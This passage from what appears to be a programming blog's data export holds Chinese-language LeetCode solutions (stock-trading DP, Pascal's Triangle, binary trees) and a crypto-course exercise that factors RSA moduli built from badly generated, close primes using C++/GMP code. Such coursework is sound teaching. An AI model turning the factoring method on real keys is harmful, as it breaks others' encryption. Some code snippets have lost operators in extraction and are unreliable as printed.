sell2 = 0; for (int i = 0; i &lt; prices.size(); ++i) &#123; sell2 = max(sell2, buy2 + prices[i]); buy2 = max(buy2, sell1 - prices[i]); sell1 = max(sell1, prices[i] + buy1); buy1 = max(buy1, -prices[i]); &#125; return sell2; &#125;&#125;; 188. Best Time to Buy and Sell Stock IV Say you have an array for which the _i_th element is the price of a given stock on day i. Design an algorithm to find the maximum profit. You may complete at most k transactions. Note: You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again). 题目地址：Best Time to Buy and Sell Stock IV 题意：给定股票每日的售价，求最多k次买卖最多可以获取多大利润？ 思路：dp 设dp[i][x]为第i天第x次交易的最大利润，则容易写出dp方程： dp[i][x] = max(dp[i-1][x] , dp[j][x - 1] + prices[i] - prices[j]) 0 &lt;= j &lt; i 上面的状态转移方程第一项为第i天不进行交易，第二项为枚举j 从0~i-1，第j天买入，第i天卖出 注意当k &gt;= len(prices) / 2的时候，说明相当于无限次交易，和第122题Best Time to Buy and Sell Stock II 一样。 上面的复杂度为O(kn^2)代码如下: C++ 12345678910111213141516171819202122232425class Solution &#123;public: int maxProfit(int k, vector&lt;int&gt;&amp; prices) &#123; if(prices.empty()) return 0; int ans = 0; if(k &gt;= prices.size() / 2)&#123; for(int i = 1; i &lt; prices.size(); ++i)&#123; if(prices[i] &gt; prices[i - 1]) ans += prices[i] - prices[i - 1]; &#125; return ans; &#125; vector&lt;vector&lt;int&gt;&gt; dp(prices.size(), vector&lt;int&gt;(k + 1, 0)); for(int x = 1; x &lt;= k; ++x)&#123; for(int i = 1; i &lt; prices.size(); ++i)&#123; dp[i][x] = dp[i - 1][x]; // 不做交易 for(int j = 0; j &lt; i; ++j)&#123; dp[i][x] = max(dp[i][x], dp[j][x - 1] + prices[i] - prices[j]); &#125; &#125; ans = max(ans, dp[prices.size() - 1][x]); &#125; return ans; &#125;&#125;; 可以对上面的代码优化，注意到枚举j是为了寻找第i天之前交易x-1次的利润最大，而这个过程重复计算了很多，可以进行优化，只需要保存i之前最大的dp[j][x - 1] - prices[j]即可。这样复杂度就变为O(nk) 123456789101112131415161718192021222324class Solution &#123;public: int maxProfit(int k, vector&lt;int&gt;&amp; prices) &#123; if(prices.empty()) return 0; int ans = 0; if(k &gt;= prices.size() / 2)&#123; for(int i = 1; i &lt; prices.size(); ++i)&#123; if(prices[i] &gt; prices[i - 1]) ans += prices[i] - prices[i - 1]; &#125; return ans; &#125; vector&lt;vector&lt;int&gt;&gt; dp(prices.size(), vector&lt;int&gt;(k + 1, 0)); for(int x = 1; x &lt;= k; ++x)&#123; int max_pre = -prices[0]; //+ dp[0][x - 1]; for(int i = 1; i &lt; prices.size(); ++i)&#123; dp[i][x] = max(dp[i - 1][x], max_pre + prices[i]); max_pre = max(max_pre, dp[i][x - 1] - prices[i]); &#125; ans = max(ans, dp[prices.size() - 1][x]); &#125; return ans; &#125;&#125;; 空间复杂度上也可以进一步优化为O(n) 1234567891011121314151617181920212223242526class Solution &#123;public: int maxProfit(int k, vector&lt;int&gt;&amp; prices) &#123; if(prices.empty()) return 0; int ans = 0; if(k &gt;= prices.size() / 2)&#123; for(int i = 1; i &lt; prices.size(); ++i)&#123; if(prices[i] &gt; prices[i - 1]) ans += prices[i] - prices[i - 1]; &#125; return ans; &#125; vector&lt;int&gt; dp(prices.size(), 0); for(int x = 1; x &lt;= k; ++x)&#123; vector&lt;int&gt; ndp(prices.size(), 0); int max_pre = -prices[0]; for(int i = 1; i &lt; prices.size(); ++i)&#123; ndp[i] = max(ndp[i - 1], max_pre + prices[i]); max_pre = max(max_pre, dp[i] - prices[i]); &#125; ans = max(ans, ndp.back()); dp = ndp; &#125; return ans; &#125;&#125;; 之前的写法： dp,设dp[i][j]为第J天进行第i次交易能获取的最大值。 当k &gt;=n/2时候，相当于第122题。Best Time to Buy and Sell Stock II dp[i][j]=max(dp[i][j-1],prices[j] + maxTemp) 我们能获取的最大利润，当我们在第j天进行抛售时。由于maxTemp已经算了买进时的价格，所以直接加上即可。 maxTemp =max(maxTemp,dp[i-1][j-1] - prices[j]) 可以理解为已获得的最大利润，即如果买进第j天的，那么用之前一轮的买卖，前一天的的利润即（dp[i-1][j-1]）减去prices[j] 1234567891011121314151617181920class Solution: # @return an integer as the maximum profit def maxProfit(self, k, prices): n = len(prices) if k &gt;= (n&gt;&gt;1):return self.maxProfit2(prices) dp =[[0 for j in xrange(n)]for i in xrange(k+1)] for i in xrange(1,k+1): maxTemp=-prices[0] for j in xrange(1,n): dp[i][j]=max(dp[i][j-1],prices[j] + maxTemp) maxTemp =max(maxTemp,dp[i-1][j-1] - prices[j]) return dp[k][n-1] def maxProfit2(self,prices): ans = 0 for i in xrange(1,len(prices)): if prices[i]&gt;prices[i-1]: ans +=prices[i]-prices[i-1] return ans 714. Best Time to Buy and Sell Stock with Transaction Fee Your are given an array of integers prices, for which the i-th element is the price of a given stock on day i; and a non-negative integer fee representing a transaction fee. You may complete as many transactions as you like, but you need to pay the transaction fee for each transaction. You may not buy more than 1 share of a stock at a time (ie. you must sell the stock share before you buy again.) Return the maximum profit you can make. Example 1: 123456789Input: prices &#x3D; [1, 3, 2, 8, 4, 9], fee &#x3D; 2Output: 8Explanation:The maximum profit can be achieved by:Buying at prices[0] &#x3D; 1Selling at prices[3] &#x3D; 8Buying at prices[4] &#x3D; 4Selling at prices[5] &#x3D; 9The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) &#x3D; 8. Note: 0 &lt; prices.length &lt;= 50000. 0 &lt; prices[i] &lt; 50000. 0 &lt;= fee &lt; 50000. 题目地址：leetcode Best Time to Buy and Sell Stock with Transaction Fee 题目大意：给定股票的价格，以及每次交易需要的花费fee，求能获得的最大利润 思路： 双状态DP，类似于Best Time to Buy and Sell Stock with Cooldown sell 考虑第i天是否卖出，buy考虑第i天是否买入 则有： sell = max(sell, buy + prices[i] - fee) buy = max(buy, sell - prices[i]) C++ 123456789101112class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices, int fee) &#123; if(prices.size() &lt; 2) return 0; int sell = 0, buy = -prices[0]; for(int i = 1; i &lt; prices.size(); i++)&#123; sell = max(sell, buy + prices[i] - fee); buy = max(buy, sell - prices[i]); &#125; return sell; &#125;&#125;; Java 1234567891011class Solution &#123; public int maxProfit(int[] prices, int fee) &#123; if(prices.length &lt; 2) return 0; int sell = 0, buy = -prices[0]; for(int i = 1; i &lt; prices.length; i++)&#123; sell = Math.max(sell, buy + prices[i] - fee); buy = Math.max(buy, sell - prices[i]); &#125; return sell; &#125;&#125; Python 1234567891011121314class Solution(object): def maxProfit(self, prices, fee): &quot;&quot;&quot; :type prices: List[int] :type fee: int :rtype: int &quot;&quot;&quot; if len(prices) &lt; 2: return 0 sell = 0 buy = -prices[0] for i in range(1, len(prices)): sell = max(sell, buy + prices[i] - fee) buy = max(buy, sell - prices[i]) return sell 本文是leetcode如下的题解 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"dynamic programming","slug":"dynamic-programming","permalink":"https://www.hrwhisper.me/tags/dynamic-programming/"}]},{"title":"leetcode 118 Pascal's Triangle || 119 Pascal's Triangle II","slug":"leetcode-pascals-triangle-or-pascals-triangle-ii","date":"2015-03-04T01:27:07.000Z","updated":"2021-01-08T13:32:16.856Z","comments":true,"path":"leetcode-pascals-triangle-or-pascals-triangle-ii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-pascals-triangle-or-pascals-triangle-ii/","excerpt":"本次题解包括 118. Pascal's Triangle 119. Pascal's Triangle II","text":"本次题解包括 118. Pascal's Triangle 119. Pascal's Triangle II 118. Pascal's Triangle Given numRows, generate the first numRows of Pascal's triangle. For example, given numRows = 5, Return 1234567[ [1], [1,1], [1,2,1], [1,3,3,1], [1,4,6,4,1]] 题目地址：leetcode Pascal's Triangle 题目大意：给定n返回前n行杨辉三角 思路：看代码吧 C++ 123456789101112131415class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; generate(int numRows) &#123; vector&lt;vector&lt;int&gt;&gt; ans; if(numRows &lt; 1) return ans; ans.push_back(vector&lt;int&gt;&#123;1&#125;); for(int i = 1; i &lt; numRows; ++i)&#123; vector&lt;int&gt; cur(i + 1, 0); for(int j = 0; j &lt;= i; ++j) cur[j] = (j != i? ans[i - 1][j]:0) + (j &gt; 0? ans[i - 1][j - 1]: 0); ans.push_back(cur); &#125; return ans; &#125;&#125;; Python 1234567891011class Solution(object): def generate(self, numRows): &quot;&quot;&quot; :type numRows: int :rtype: List[List[int]] &quot;&quot;&quot; ans=[[1], [1,1]] for i in range(1, numRows + 1): temp = [1]+ [ans[-1][t] + ans[-1][t + 1] for t in range(len(ans[-1]) - 1)] + [1] ans.append(temp) return ans[:numRows] 119. Pascal's Triangle II Given an index k, return the _k_th row of the Pascal's triangle. For example, given k = 3, Return [1,3,3,1]. Note: Could you optimize your algorithm to use only O(k) extra space? 题目地址：leetcode Pascal's Triangle II 题目大意：给定n返回第n行杨辉三角(下标从0开始) 思路：看代码 C++ 1234567891011121314class Solution &#123;public: vector&lt;int&gt; getRow(int k) &#123; vector&lt;int&gt; cur(k + 1, 0); cur[0] = 1; for(int i = 1; i &lt;= k; ++i)&#123; vector&lt;int&gt; next(i + 1, 1); for(int j = 1; j &lt; i; ++j) next[j] = cur[j - 1] + cur[j]; cur = next; &#125; return cur; &#125;&#125;; Python 12345678910111213class Solution(object): def getRow(self, rowIndex): &quot;&quot;&quot; :type rowIndex: int :rtype: List[int] &quot;&quot;&quot; ans = [[1], [1, 1]] if rowIndex &lt; 2: return ans[rowIndex] pre = ans[-1] for i in range(1, rowIndex): temp = [1] + [pre[t] + pre[t + 1] for t in range(len(pre) - 1)] + [1] pre = temp return pre 本文是leetcode如下的题解 118. Pascal's Triangle 119. Pascal's Triangle II 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"Public Key Encryption from Trapdoor Permutations - Integer Factorization","slug":"public-key-encryption-from-trapdoor-permutations-integer-factorization","date":"2015-03-03T04:10:32.000Z","updated":"2020-10-20T01:32:32.410Z","comments":true,"path":"public-key-encryption-from-trapdoor-permutations-integer-factorization/","link":"","permalink":"https://www.hrwhisper.me/public-key-encryption-from-trapdoor-permutations-integer-factorization/","excerpt":"RSA的大整数分解。","text":"RSA的大整数分解。 &gt; Your goal in this project is to break RSA when the public modulus N is generated incorrectly. This should serve as yet another reminder not to implement crypto primitives yourself. &gt; &gt; Normally, the primes that comprise an RSA modulus are generated independently of one another. But suppose a developer decides to generate the first prime p by choosing a random number R and scanning for a prime close by. The second prime q is generated by scanning for some other random prime also close to R. We show that the resulting RSA modulus N = pq can be easily factored. &gt; &gt; Suppose you are given a composite N and are told that N is a product of two relatively close primes p and q, namely p and q satisfy &gt; &gt; \\[ &gt; |p - q|&lt; 2 N^{1/4} &gt; \\] &gt; &gt; Your goal is to factor N. &gt; &gt; Let A be the arithmetic average of the two primes, that is. Since p and q are odd, we know that p + q is even and therefore A is an integer. &gt; &gt; To factor N you first observe that under condition given above the quantity N is very close to A. In particular &gt; &gt; \\[ &gt; A - sqrt(N) &lt; 1 &gt; \\] &gt; &gt; as shown below. But since A is an integer, rounding sqrt(N) up to the closest integer reveals the value of A. In code, A=ceil(sqrt(N)) where \"ceil\" is the ceiling function. Visually, the numbers p, q, sqrt( N) and A are ordered as in figure 1. &gt; &gt; Since A is the exact mid-point between p and q there is an integer x such that p = A − x and q = A + x. But then &gt; &gt; \\[ &gt; N = pq = (A − x)(A + x) = A^2 − x^2 &gt; \\] &gt; &gt; and therefore &gt; &gt; \\[ &gt; x = sqrt(A^2 -N) &gt; \\] &gt; &gt; Now, given x and A you can find the factors p and q of N since p = A − x and q = A + x. &gt; &gt; In the following challenges, you will factor the given moduli using the method outlined above. To solve this assignment it is best to use an environment that supports multi-precision arithmetic and square roots. In Python you could use the gmpy2 module. In C you can use GMP. &gt; &gt; Factoring challenge #1: The following modulus N is a products of two primes p and q where\\(|p - q|&lt; 2 N^{1/4}\\) . Find the smaller of the two factors and enter it as a decimal integer. &gt; N = 17976931348623159077293051907890247336179769789423065727343008115 &gt; 77326758055056206869853794492129829595855013875371640157101398586 &gt; 47833778606925583497541085196591615128057575940752635007475935288 &gt; 71082364994994077189561705436114947486504671101510156394068052754 &gt; 0071584560878577663743040086340742855278549092581 &gt; &gt; Factoring challenge #2: The following modulus N is a products of two primes p and q where \\(|p - q|&lt; 2^{11}N^{1/4}\\) . Find the smaller of the two factors and enter it as a decimal integer. &gt; &gt; Hint: in this case \\(A−N &lt; 2^{20}\\) so try scanning for A from N upwards, until you succeed in factoring N. &gt; &gt; N = 6484558428080716696628242653467722787263437207069762630604390703787 &gt; 9730861808111646271401527606141756919558732184025452065542490671989 &gt; 2428844841839353281972988531310511738648965962582821502504990264452 &gt; 1008852816733037111422964210278402893076574586452336833570778346897 &gt; 15838646088239640236866252211790085787877 &gt; &gt; Factoring challenge #3: The following modulus N is a products of two primes p and q where \\(|3p - 2q|&lt; N^{1/4}\\). Find the smaller of the two factors and enter it as a decimal integer. &gt; &gt; Hint: use the calculation below to show that sqrt(6N) is close to (3p+2q)/2 and then adapt the method above to factor N. Also note that (3p+2q)/2 may not be an integer, which is a significant property for you to use. &gt; &gt; N = 72006226374735042527956443552558373833808445147399984182665305798191 &gt; 63556901883377904234086641876639384851752649940178970835240791356868 &gt; 77441155132015188279331812309091996246361896836573643119174094961348 &gt; 52463970788523879939683923036467667022162701835329944324119217381272 &gt; 9276147530748597302192751375739387929 问题1和2 问题1和2是类似的，只不过问题2范围比较大。 A为p和q的中点，有： \\[ A = \\frac{p+q}{2} \\] \\[ n = pq = (A-x)(A+x) = A^2 - x^2 \\] 于是有 \\[ x = \\sqrt{A^2-n} \\] 因为 \\[ 2A = p + q \\geq 2\\sqrt{pq} = 2\\sqrt{n} \\] 即 \\[ A \\geq \\sqrt{n} \\] 所以一开始令(A = )，向上扫描，直到pq=n为止。 问题3 若模仿上面的做法A取3p和2q的中点，即： \\[ A = \\frac{3p+2q}{2} \\] 但是3p+2q不能被2整除！ 于是我们可以A取6p和4q的中点 \\[ A = \\frac{6p+4q}{2} \\] \\[ 2A = 6p + 4q \\geq 2\\sqrt{6p4q} = 2\\sqrt{24n} \\] 即 \\[ A \\geq \\sqrt{24n} \\] 我们可以找到 \\[ 24n = 6p 4q = (A-x)(A+x) = A^2 - x^2 \\] 于是有： \\[ x= \\sqrt{A^2-24n} \\] 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/* Integer Factorization by hrwhisper 2014.12.20*/#include&lt;iostream&gt;#include&lt;gmpxx.h&gt;#include&lt;gmp.h&gt;using namespace std; const char n1[]=&quot;179769313486231590772930519078902473361797697894230657273430081157732675805505620686985379449212982959585501387537164015710139858647833778606925583497541085196591615128057575940752635007475935288710823649949940771895617054361149474865046711015101563940680527540071584560878577663743040086340742855278549092581&quot;; const char n2[]=&quot;648455842808071669662824265346772278726343720706976263060439070378797308618081116462714015276061417569195587321840254520655424906719892428844841839353281972988531310511738648965962582821502504990264452100885281673303711142296421027840289307657458645233683357077834689715838646088239640236866252211790085787877&quot;;const char n3[]=&quot;720062263747350425279564435525583738338084451473999841826653057981916355690188337790423408664187663938485175264994017897083524079135686877441155132015188279331812309091996246361896836573643119174094961348524639707885238799396839230364676670221627018353299443241192173812729276147530748597302192751375739387929&quot;; mpz_class solve(mpz_class &amp;n)&#123; mpz_class q,p,A,x; x=0; A=sqrt(n); p=A-x; q=A+x; while(p*q!=n) &#123; A++; x=sqrt(A*A-n); p=A-x; q=A+x; &#125; return p;&#125;mpz_class solve2(mpz_class &amp;n)&#123; mpz_class A,x,p; A= sqrt(n * 24) + 1; x = sqrt(A*A - 24*n); p = (A - x) / 6; return p;&#125;int main()&#123; mpz_class n,ans; int task; cin&gt;&gt;task; if(task==1) &#123; n=n1; ans=solve(n); &#125; else if(task==2) &#123; n=n2; ans=solve(n); &#125; else &#123; n=n3; ans=solve2(n); &#125; cout&lt;&lt;ans&lt;&lt;endl; return 0; &#125; 运行结果","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"信息安全","slug":"study/信息安全","permalink":"https://www.hrwhisper.me/categories/study/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"}]},{"title":"leetcode Tree 整理版","slug":"leetcode-tree","date":"2015-03-02T03:10:45.000Z","updated":"2021-01-08T13:14:49.680Z","comments":true,"path":"leetcode-tree/","link":"","permalink":"https://www.hrwhisper.me/leetcode-tree/","excerpt":"本次题解为 leetcode tree 的整理，包括 依照leetcode定义 自己写的createTree方法，便于测试中序遍历的下标和 94 Binary Tree Inorder Traversal 95 Unique Binary Search Trees II 96 Unique Binary Search Trees 98 Validate Binary Search Tree 99 Recover Binary Search Tree 100 Same Tree 101 Symmetric Tree 102 Binary Tree Level Order Traversal 103 Binary Tree Zigzag Level Order Traversal 104 Maximum Depth of Binary Tree 105 Construct Binary Tree from Preorder and Inorder Traversal 106 Construct Binary Tree from Inorder and Postorder Traversal 107 Binary Tree Level Order Traversal II 108 Convert Sorted Array to Binary Search Tree 109 Convert Sorted List to Binary Search Tree 110 Balanced Binary Tree 111 Minimum Depth of Binary Tree 112 Path Sum 113 Path Sum II 114 Flatten Binary Tree to Linked List 116 Populating Next Right Pointers in Each Node 117 Populating Next Right Pointers in Each Node II 124 Binary Tree Maximum Path Sum 129 Sum Root to Leaf Numbers 144 Binary Tree Preorder Traversal 145 Binary Tree Postorder Traversal 173 Binary Search Tree Iterator 199 Binary Tree Right Side View 222 Count Complete Tree Nodes 226 Invert Binary Tree 230 Kth Smallest Element in a BST 235 Lowest Common Ancestor of a Binary Search Tree 236 Lowest Common Ancestor of a Binary Tree 257 Binary Tree Paths 297 Serialize and Deserialize Binary Tree 449. Serialize and Deserialize BST","text":"本次题解为 leetcode tree 的整理，包括 依照leetcode定义 自己写的createTree方法，便于测试中序遍历的下标和 94 Binary Tree Inorder Traversal 95 Unique Binary Search Trees II 96 Unique Binary Search Trees 98 Validate Binary Search Tree 99 Recover Binary Search Tree 100 Same Tree 101 Symmetric Tree 102 Binary Tree Level Order Traversal 103 Binary Tree Zigzag Level Order Traversal 104 Maximum Depth of Binary Tree 105 Construct Binary Tree from Preorder and Inorder Traversal 106 Construct Binary Tree from Inorder and Postorder Traversal 107 Binary Tree Level Order Traversal II 108 Convert Sorted Array to Binary Search Tree 109 Convert Sorted List to Binary Search Tree 110 Balanced Binary Tree 111 Minimum Depth of Binary Tree 112 Path Sum 113 Path Sum II 114 Flatten Binary Tree to Linked List 116 Populating Next Right Pointers in Each Node 117 Populating Next Right Pointers in Each Node II 124 Binary Tree Maximum Path Sum 129 Sum Root to Leaf Numbers 144 Binary Tree Preorder Traversal 145 Binary Tree Postorder Traversal 173 Binary Search Tree Iterator 199 Binary Tree Right Side View 222 Count Complete Tree Nodes 226 Invert Binary Tree 230 Kth Smallest Element in a BST 235 Lowest Common Ancestor of a Binary Search Tree 236 Lowest Common Ancestor of a Binary Tree 257 Binary Tree Paths 297 Serialize and Deserialize Binary Tree 449. Serialize and Deserialize BST 1.首先是leetcode对于树的表示方法： OJ's Binary Tree Serialization: The serialization of a binary tree follows a level order traversal, where '#' signifies a path terminator where no node exists below. Here's an example: 1234567 1 &#x2F; \\2 3 &#x2F; 4 \\ 5 The above binary tree is serialized as \"&#123;1,2,3,null,null,4,null,null,5&#125;\". 树结点表示为： 12345class TreeNode(object): def __init__(self, x): self.val &#x3D; x self.left &#x3D; None self.right &#x3D; None 我的建树方法见297题 Serialize and Deserialize Binary Tree的方法一 2.题解归类 1.构建树 用前序和中序建树105 用后序和中序建树106 数组构建BST 108 链表构建BST 109 2.树的遍历 前序 144 中序 94 后序 145 层次 102 103 107 3.树的属性 求深度 104 是否平衡是平衡树 110 最小深度 111 4.BST树 判断BST是否合法 98 恢复BST 99 BST实现迭代：173（用到某一遍历） 3.题解代码（按题号顺序） 94. Binary Tree Inorder Traversal Given a binary tree, return the inorder traversal of its nodes' values. For example: Given binary tree &#123;1,#,2,3&#125;, 1234561 \\ 2 &#x2F;3 return [1,3,2]. 题目地址:leetcode 94 Binary Tree Inorder Traversal 题意：给定一棵树，求它的中序遍历。 思路：中序遍历和前序、后序不同地方在于是先输出左子结点然后根结点，最后右子结点。 递归版本很好理解。 非递归版本先将所有左子树入栈，之后将所有右子树的左子树入栈。（看代码吧~） Python 12345678910111213141516class Solution: # @param root, a tree node # @return a list of integers def inorderTraversal(self, root): ans=[] self.dfs(root,ans) return ans def dfs(self,root,ans): if not root : return self.dfs(root.left,ans) ans.append(root.val) self.dfs(root.right,ans) Python非递归版本 123456789101112131415161718class Solution: # @param root, a tree node # @return a list of integers def inorderTraversal(self, root): if not root: return [] ans,q=[],[] self.allLeftIntoStack(root,q) while q: t=q.pop() ans.append(t.val) if t.right:self.allLeftIntoStack(t.right,q) return ans def allLeftIntoStack(self,root,q): while root: q.append(root) root=root.left 95. Unique Binary Search Trees II Given n, generate all structurally unique BST's (binary search trees) that store values 1..._n_. For example, Given n = 3, your program should return all 5 unique BST's shown below. 1234561 3 3 2 1 \\ &#x2F; &#x2F; &#x2F; \\ \\ 3 2 1 1 3 2 &#x2F; &#x2F; \\ \\2 1 2 3 题目地址：leetcode Unique Binary Search Trees II 题目大意：给定n，求1~n共n个数，能组成几棵不一样的BST，建立这些树并且返回所有不同BST的根结点。 思路： 分治，对于1n这n个数，都有可能成为根结点。枚举1n，对于 1&lt;=i&lt;=n，有i的左结点为[1,i-1] (i-1 &gt;=1),右结点是[i+1,n] i+1 &lt;=n 递归的获取左右子结点，然后只需要建立根结点，使根结点的左右子结点指向获取的左右子结点即可。 C++ 12345678910111213141516171819202122232425262728class Solution &#123; vector&lt;TreeNode*&gt; build(int s, int e) &#123; vector&lt;TreeNode*&gt; ans; if (s &gt; e) &#123; ans.push_back(nullptr); return ans; &#125; for (int k = s; k &lt;= e; ++k) &#123; vector&lt;TreeNode*&gt; left = build(s, k - 1); vector&lt;TreeNode*&gt; right = build(k + 1, e); for (int i = 0; i &lt; left.size(); ++i) &#123; for (int j = 0; j &lt; right.size(); ++j) &#123; TreeNode *root = new TreeNode(k); root-&gt;left = left[i]; root-&gt;right = right[j]; ans.push_back(root); &#125; &#125; &#125; return ans; &#125;public: vector&lt;TreeNode*&gt; generateTrees(int n) &#123; return n &gt;= 1 ? build(1, n) : vector&lt;TreeNode *&gt;(); &#125;&#125;; Python 12345678910111213141516171819202122class Solution(object): def generateTrees(self, n): &quot;&quot;&quot; :type n: int :rtype: List[TreeNode] &quot;&quot;&quot; return self.dfs(1, n) if n &gt;= 1 else [] def dfs(self, s, e): if s &gt; e: return [None] ans = [] for i in range(s, e + 1): L = self.dfs(s, i - 1) R = self.dfs(i + 1, e) for left in L: for right in R: root = TreeNode(i) root.left, root.right = left, right ans.append(root) return ans 96. Unique Binary Search Trees Given n, how many structurally unique BST's (binary search trees) that store values 1..._n_? For example, Given n = 3, there are a total of 5 unique BST's. 1234561 3 3 2 1 \\ &#x2F; &#x2F; &#x2F; \\ \\ 3 2 1 1 3 2 &#x2F; &#x2F; \\ \\2 1 2 3 题目大意：给定n，求1~n共n个数，能组成几棵不一样的BST 思路： 可以类似95题写dfs+记忆化搜索 123456789101112131415161718192021class Solution &#123; int dfs(int n, vector&lt;int&gt; &amp;dp) &#123; if (n == 0) return 0; if (n == 1) return 1; if (dp[n] != -1) return dp[n]; int cnt = 0; for (int k = 1; k &lt;= n; ++k) &#123; int left = dfs(k - 1, dp); int right = dfs(n - k, dp); if (left == 0) cnt += right; else if (right == 0) cnt += left; else cnt += right * left; &#125; return dp[n] = cnt; &#125;public: int numTrees(int n) &#123; vector&lt;int&gt; dp(n + 1, -1); return dfs(n, dp); &#125;&#125;; 也可以写成非递归的形式： 设dp[n]为n个数组成的不同BST总数。 如果左儿子个数为j，有儿子显然为n-1-j个，那么总共显然有 dp[j] * dp[n-1-j]种 故枚举j从0~n-1然后相加既可。 C++ 1234567891011class Solution &#123;public: int numTrees(int n) &#123; vector&lt;int&gt; dp(n + 1, 0); dp[0] = 1; for (int i = 1; i &lt;= n; ++i) for (int j = 0; j &lt; i; ++j) dp[i] += dp[j] * dp[i - j - 1]; return dp[n]; &#125;&#125;; Python 123456789101112class Solution(object): def numTrees(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; dp = [0] * (n + 1) dp[0] = 1 for i in range(1, n + 1): for j in range(i): dp[i] += dp[j] * dp[i - 1 - j] return dp[n] 98. Validate Binary Search Tree Given a binary tree, determine if it is a valid binary search tree (BST). Assume a BST is defined as follows: The left subtree of a node contains only nodes with keys less than the node's key. The right subtree of a node contains only nodes with keys greater than the node's key. Both the left and right subtrees must also be binary search trees. 题目地址：leetcode 98 Validate Binary Search Tree 题意：给定一棵BST，判断其是否合法。合法需要满足： 根结点大于左子树结点， 根结点小于右子树结点。 左右子树是合法的BST 思路: 递归判断左右子树。需要用出现过的最大、最小值来判断。 如左子树最大值不可能超过根，右子树最小值不可能小于根 中序遍历。 合法的BST中序遍历必为有序序列。 方法一 C++ 12345678910111213class Solution &#123; bool dfs(TreeNode *root, long min_v, long max_v)&#123; if(!root) return true; if(root-&gt;val &lt;= min_v root-&gt;val &gt;= max_v) return false; return dfs(root-&gt;left, min_v, root-&gt;val) &amp;&amp; dfs(root-&gt;right, root-&gt;val, max_v); &#125; public: bool isValidBST(TreeNode* root) &#123; return dfs(root, LONG_MIN, LONG_MAX); &#125;&#125;; Python 1234567891011class Solution: # @param root, a tree node # @return a boolean def isValidBST(self, root): INF = float(&#x27;inf&#x27;) return self.judge(root,-INF,INF) def judge(self,root,minV,maxV): if not root: return True if root.val &lt;= minV or root.val &gt;= maxV: return False return self.judge(root.left,minV,root.val) and \\ self.judge(root.right,root.val,maxV) 方法二 C++ 12345678910111213141516class Solution &#123; bool dfs(TreeNode *root, TreeNode * &amp;pre)&#123; if(!root) return true; bool left = dfs(root-&gt;left, pre); if(!left pre &amp;&amp; pre-&gt;val &gt;= root-&gt;val) return false; pre = root; return dfs(root-&gt;right, pre); &#125; public: bool isValidBST(TreeNode* root) &#123; TreeNode *pre = nullptr; return dfs(root, pre); &#125;&#125;; Python 123456789101112131415class Solution(object): def isValidBST(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: bool &quot;&quot;&quot; pre = [None] return self.dfs(root, pre) def dfs(self, root, pre): if not root: return True if not self.dfs(root.left, pre) or pre[0] and root.val &lt;= pre[0].val: return False pre[0] = root return self.dfs(root.right, pre) 99. Recover Binary Search Tree Two elements of a binary search tree (BST) are swapped by mistake. Recover the tree without changing its structure. Note: A solution using O(n) space is pretty straight forward. Could you devise a constant space solution? 题目地址：leetcode 99 Recover Binary Search Tree 题意：一棵BST中有两个元素被调换了，求在不破坏BST情况下，将其恢复。 思路：对于此问题，关键是要找到被调换的两个元素。我们知道，对于中序遍历，合法的BST数必为有序，故进行中序遍历，如果pre.val &gt;root.val说明有误。注意区分第一次和第二次，标记即可。 C++ 12345678910111213141516171819class Solution &#123; void dfs(TreeNode *root, TreeNode *&amp;pre, TreeNode *&amp;first, TreeNode *&amp;second)&#123; if(!root) return; dfs(root-&gt;left, pre, first, second); if(pre &amp;&amp; root-&gt;val &lt;= pre-&gt;val)&#123; if(!first) first = pre; second = root; &#125; pre = root; dfs(root-&gt;right, pre, first, second); &#125; public: void recoverTree(TreeNode* root) &#123; TreeNode *first = nullptr, *second = nullptr, *pre = nullptr; dfs(root, pre, first, second); swap(first-&gt;val, second-&gt;val); &#125;&#125;; Python 123456789101112131415161718192021class Solution: # @param root, a tree node # @return a tree node def recoverTree(self, root): self.pre,self.first,self.second=None,None,None self.dfs(root) t=self.first.val self.first.val,self.second.val = self.second.val,t return root def dfs(self,root): if not root: return if root.left: self.dfs(root.left) if self.pre: if self.pre.val &gt; root.val : if not self.first :self.first,self.second=self.pre,root else: self.second=root self.pre=root if root.right: self.dfs(root.right) 100. Same Tree Given two binary trees, write a function to check if they are equal or not. Two binary trees are considered equal if they are structurally identical and the nodes have the same value. 题目地址：leetcode Same Tree 题目大意：给定两棵树，判断他们是否相等（结构和值都相等） 思路：递归判断即可。 C++ 123456789class Solution &#123;public: bool isSameTree(TreeNode* p, TreeNode* q) &#123; if (!p &amp;&amp; !q) return true; if (p &amp;&amp; !q || !p &amp;&amp; q) return false; if (p-&gt;val != q-&gt;val) return false; return isSameTree(p-&gt;left, 